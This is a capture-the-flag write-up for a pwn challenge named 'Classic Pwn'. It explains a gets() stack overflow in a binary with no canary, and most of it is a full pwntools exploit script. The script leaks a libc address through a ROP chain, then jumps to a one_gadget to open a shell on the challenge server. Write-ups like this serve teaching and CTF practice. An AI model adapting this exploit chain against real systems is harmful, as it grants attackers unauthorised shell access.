## Classic Pwn (Pwn)

### Solution
The programe use `gets()` to read input into a stack buffer, there's no canary, so we can easily use ROP to leak libc and spawn a shell.

```python
#!/usr/bin/env python3

from pwn import *
context(arch="amd64", terminal=["tmux", "neww"])

b = ELF("./classic")
libc = ELF("./libc-2.23.so")
rop = ROP(b)

one_gadget = 0x45216

payload = b"a" * 72
payload += p64(rop.rdi.address) # puts@plt(puts@got)
payload += p64(b.got[b'puts'])
payload += p64(b.plt[b'puts'])
payload += p64(b.symbols[b'main'])

#r = process("./classic")
r = remote("classic.pwn.seccon.jp", 17354)
r.sendline(payload)
r.recvuntil("!!\n")
puts = u64(r.recv(6).ljust(8, b"\x00"))

payload = b"a" * 72
payload += p64(puts - libc.symbols[b'puts'] + one_gadget)
r.sendline(payload)

r.interactive()
```
